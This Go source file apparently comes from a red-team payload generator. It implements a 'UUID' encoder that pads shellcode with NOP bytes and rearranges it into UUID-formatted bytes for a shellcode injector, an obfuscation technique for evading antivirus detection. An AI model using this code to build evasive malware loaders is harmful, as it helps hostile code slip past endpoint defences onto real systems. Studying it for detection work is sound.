package _go

//Thanks https://github.com/Ne0nd0g/go-shellcode#UuidFromStringA

import (
	"bytes"
	"embed"
	"encoding/binary"

	"github.com/guervild/uru/pkg/models"
)

type UUIDEncoder struct {
	Name        string
	Description string
}

func NewUUIDEncoder() models.ObjectModel {
	return &UUIDEncoder{
		Name:        "UUID",
		Description: "[experimental/dev] Transform data into UUID string (only works with ninjauuid injector).",
	}
}

// https://github.com/Ne0nd0g/go-shellcode/blob/master/cmd/UuidFromString/main.go
func (e *UUIDEncoder) Encode(shellcode []byte) ([]byte, error) {
	// Pad shellcode to 16 bytes, the size of a UUID
	if 16-len(shellcode)%16 < 16 {
		pad := bytes.Repeat([]byte{byte(0x90)}, 16-len(shellcode)%16)
		shellcode = append(shellcode, pad...)
	}

	var uuids []byte

	for i := 0; i < len(shellcode); i += 16 {
		var uuidBytes []byte

		// Add first 4 bytes
		buf := make([]byte, 4)
		binary.LittleEndian.PutUint32(buf, binary.BigEndian.Uint32(shellcode[i:i+4]))
		uuidBytes = append(uuidBytes, buf...)

		// Add next 2 bytes
		buf = make([]byte, 2)
		binary.LittleEndian.PutUint16(buf, binary.BigEndian.Uint16(shellcode[i+4:i+6]))
		uuidBytes = append(uuidBytes, buf...)

		// Add next 2 bytes
		buf = make([]byte, 2)
		binary.LittleEndian.PutUint16(buf, binary.BigEndian.Uint16(shellcode[i+6:i+8]))
		uuidBytes = append(uuidBytes, buf...)

		// Add remaining
		uuidBytes = append(uuidBytes, shellcode[i+8:i+16]...)

		uuids = append(uuids, uuidBytes...)
	}

	return uuids, nil
}

func (e *UUIDEncoder) GetImports() []string {

	return []string{
		`"encoding/hex"`,
	}
}

func (e *UUIDEncoder) RenderInstanciationCode(data embed.FS) (string, error) {

	return "", nil
}

func (e *UUIDEncoder) RenderFunctionCode(data embed.FS) (string, error) {

	return "", nil
}
